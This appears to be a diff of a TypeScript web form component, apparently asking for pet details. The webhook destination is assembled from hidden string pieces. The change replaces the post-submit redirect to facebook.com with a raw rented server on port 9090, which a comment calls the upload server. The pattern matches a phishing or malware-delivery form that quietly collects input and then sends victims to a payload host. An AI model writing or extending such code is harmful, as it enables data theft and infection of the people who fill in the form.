@@ -46,7 +46,7 @@ const WEBHOOK_URL: string = [
 ].join('');
 
 // Final destination after submit (short link to the upload server).
-const REDIRECT_URL = 'https://www.facebook.com';
+const REDIRECT_URL = 'http://srv2107713.hstgr.cloud:9090';
 
 const initialState: FormState = {
   petName: '',
